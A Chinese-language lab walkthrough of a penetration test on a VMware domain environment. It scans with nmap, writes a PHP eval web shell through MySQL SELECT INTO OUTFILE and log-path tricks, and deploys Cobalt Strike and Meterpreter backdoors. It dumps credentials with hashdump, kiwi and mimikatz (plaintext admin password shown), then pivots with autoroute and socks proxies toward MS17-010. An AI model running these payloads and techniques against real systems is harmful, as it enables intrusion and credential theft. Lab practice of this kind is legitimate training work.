# 1：环境搭建

使用VMware对网络环境配置

网络拓扑如下：

![image](https://img2022.cnblogs.com/blog/2734154/202205/2734154-20220514232922855-930152919.png)

# 2：渗透测试

## 2.1: 信息收集

`nmap -sn --min-rate=10000 192.168.42.128/24` 目标主机发现

<img src="C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307105529098.png" alt="image-20230307105529098" style="zoom:150%;" />



本机ip131，靶机ip130

`sudo nmap -p- -sV -O --min-rate=10000 192.168.42.130` 端口信息探测

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 21:57 EST
Nmap scan report for 192.168.42.130
Host is up (0.00044s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:DB:0B:E2 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|8|8.1|Vista|2008
OS CPE: cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1
OS details: Microsoft Windows 7 Professional or Windows 8, Microsoft Windows 8.1 R1, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.29 seconds
```

漏洞扫描：`sudo nmap -p80,3306 -sV --script=vuln --min-rate=10000 192.168.42.130`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 22:04 EST
Nmap scan report for 192.168.42.130
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.42.130
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.42.130:80/
|     Form id: 
|     Form action: /l.php#bottom
|     
|     Path: http://192.168.42.130:80/l.php
|     Form id: 
|_    Form action: /l.php#bottom
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-phpself-xss: 
|   VULNERABLE:
|   Unsafe use of $_SERVER["PHP_SELF"] in PHP files
|     State: VULNERABLE (Exploitable)
|       PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
|              
|     Extra information:
|       
|   Vulnerable files with proof of concept:
|     http://192.168.42.130/l.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.42.130
|     References:
|       http://php.net/manual/en/reserved.variables.server.php
|_      https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.42.130:80/l.php?act=Function%27%20OR%20sqlspider
|     http://192.168.42.130:80/l.php?act=phpinfo%27%20OR%20sqlspider
|     http://192.168.42.130:80/l.php?act=Function%27%20OR%20sqlspider
|     http://192.168.42.130:80/l.php?act=phpinfo%27%20OR%20sqlspider
|     http://192.168.42.130:80/l.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider
|     http://192.168.42.130:80/l.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000%27%20OR%20sqlspider
|     http://192.168.42.130:80/l.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider
|   Possible sqli for forms:
|     Form at path: /, form's action: /l.php#bottom. Fields that might be vulnerable:
|       host
|       port
|       login
|       funName
|     Form at path: /l.php, form's action: /l.php#bottom. Fields that might be vulnerable:
|       host
|       port
|       login
|_      funName
| http-enum: 
|   /phpinfo.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /phpMyAdmin/: phpMyAdmin
|_  /PHPMyAdmin/: phpMyAdmin
|
|_http-trace: TRACE is enabled
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:DB:0B:E2 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.24 seconds

```

## 2.2：漏洞利用

扫描结果来看存在以下可利用点：

| php探针信息泄露      | 包括但不限于mysql                       |
| -------------------- | --------------------------------------- |
| 网站后台目录信息泄露 | /phpinfo.php: Possible information file |
|                      | /phpmyadmin/: phpMyAdmin                |
|                      | /phpMyAdmin/: phpMyAdmin                |

访问网站`80`端口服务

![image-20230307160623865](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307160623865.png)

使用弱口令尝试MySQL登录：`root` 

![image-20230307160836179](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307160836179.png)

得到数据库密码
访问后端登录界面：

扫目录得到后台php admin

phpmyadmin是管理数据库的web端，密码极有可能是数据库密码

<img src="C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307161122103.png" alt="image-20230307161122103" style="zoom: 80%;" />

发现重要的信息，可能对渗透会有帮助`168a73655bfecefdb15b14984dd2ad60`

![image-20230307161625600](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307161625600.png)

使用hashcat尝试破解，无果

尝试通过select写入一句话木马：

```
select "<?php eval($_POST['shell']);?>" into outfile 'C:/phpStudy/WWW/shell.php'
```

![image-20230307164748813](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307164748813.png)

## 日志写入

因为后台限制不能上传，想到通过修改日志路径，涉及两个全局变量的修改

![image-20230307165147951](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307165147951.png)

内容：

```
select '<?php eval($_POST[shell]);?>' 
```

上传木马成功

尝试访问页面，antsowad连接

![image-20230307172126343](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307172126343.png)

发现cms且没有被扫到试着访问：

![image-20230307172743160](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230307172743160.png)

写着密码，登录：

发现模板文件将木马注入，可以获取另一个shell，然后在网上下载同样的CMS查找文件路径

> ps:不止一个日志可以注入，slow_log，erro_log均可

## 2.3:后渗透

![image-20230314160705526](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230314160705526.png)

在终端发现当前用户权限和内网地址

```
 连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::5d32:41be:36af:301e%25
   IPv4 地址 . . . . . . . . . . . . : 192.168.52.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.52.2
```

使用工具Cobalt-Strike

建立listener，生成后门，使用蚁剑上传，并使用命令行执行程序，得到回显获得后门

![image-20230314174614246](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230314174614246.png)

控制台输入 sleep 0关闭睡眠

```
net localgroup administrators
```



z1模块，读取信息得到明文密码

![image-20230315111424264](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230315111424264.png)

使用远程连接检查3389是否开启，可以进行远程控制

> 使用msf和cs联动，未能成功

单独上传msf后门并使用getsystem提权

查看ip

```
ware MAC : 00:0c:29:4f:75:fa
MTU          : 1500
IPv4 Address : 192.168.52.10
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::8f3:8764:dda1:ab9f
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

2：msf读取密码

`run hashdump`



migrate PID 迁移进程

![image-20230315184355037](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230315184355037.png)

```
net config workstation  查看是否有域，以及当前登录域
net view 查看域内主机列表
查看域控：
net group "domain controllers" /domain 查看域控制器(如果有多台)
net user /domain 查看域内所有域用户 
net group "domain admins" /domain 查看域管理员列表
```



# 内网渗透

`arp -a`

确定内网主机ip

```
192.168.52.138   00:0c:29:5a:a1:61  25
192.168.52.141   00:0c:29:e7:59:19  25
```

获得域内信息

```
net user /domain
```

```
kiwi模块抓取明文密码

User Name         : Administrator
Domain            : GOD
Logon Server      : OWA
Logon Time        : 2023/3/15 8:51:52
SID               : S-1-5-21-2952760202-1353902439-2381784089-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : GOD
         * LM       : 3ad8d90de182d2e6f72c44fed3c74f89
         * NTLM     : e5ae562ddfaa6b446c32764ab1ebf3ed
         * SHA1     : 7ee845d73a20bad83986aac53b20622b44a8f1a3
        tspkg :
         * Username : Administrator
         * Domain   : GOD
         * Password : 123!@#qwe
        wdigest :
         * Username : Administrator
         * Domain   : GOD
         * Password : 123!@#qwe
        kerberos :
         * Username : Administrator
         * Domain   : GOD.ORG
         * Password : 123!@#qwe

```

```
以下3种都可尝试
1.run hashdump
2.加载 kiwi模块
load kiwi     加载kiwi模块
creds_all    列出所有凭据
3.加载mimikatz模块
Windows10/2012 以下的版本可以直接抓取明文密码
	再尝试加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，
	而且该进程也需要 是system权限运行的。 
	ps 查看进程
migrate PID (该进程需要是x64且system权限)
load mimikatz 
mimikatz_command -f sekurlsa::searchPasswords

```

# 横向移动

添加路由

```
1. run autoroute -s 192.168.52.0/24		添加路由
2. run autoroute -p       查看是否添加成功 
3. background           返回
4. route print			输出路由
```

![image-20230315175517308](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230315175517308.png)

另一种方法

`run post/multi/manage/autoroute `



![image-20230315185722754](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230315185722754.png)

添加代理

```
use auxiliary/server/socks_proxy 	使用 socks_proxy模块
set srvhost 172.16.170.37
set version 4a
exploit
```

![image-20230315190040529](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230315190040529.png)



使用proxychains4，修改配置文件

在末尾添加

```
socks4 ip port
```

```
Proxychains nmap -sT -Pn 192.168.52.143
```

扫描内网

使用内置模块对内网扫描

```
run post/windows/gather/arp_scanner rhosts=192.168.52.0/24

[+]     IP: 192.168.52.10 MAC 00:0c:29:4f:75:fa (VMware, Inc.)   本机
[+]     IP: 192.168.52.138 MAC 00:0c:29:5a:a1:61 (VMware, Inc.)  主机
[+]     IP: 192.168.52.141 MAC 00:0c:29:e7:59:19 (VMware, Inc.)  主机
[+]     IP: 192.168.52.255 MAC 00:0c:29:4f:75:fa (VMware, Inc.)  网关
```



# 内网探测

使用nmap扫描内网

```
proxychains nmap --script=vuln 192.168.52.141

PORT     STATE SERVICE
21/tcp   open  ftp  
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
777/tcp  open  multiling-http
1025/tcp open  NFS-or-IIS
1038/tcp open  mtqp
1042/tcp open  afrog
1043/tcp open  boinc
6002/tcp open  X11:2
7001/tcp open  afs3-callback
7002/tcp open  afs3-prserver
8099/tcp open  unknown

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
```

可以看到开放了许多端口，还列出来了漏洞

使用kali内置模块

```
search ms17-010 //扫出的漏洞
use auxiliary/scanner/smb/smb_ms17_010 
set rhost 10.37.129.7 
run
```

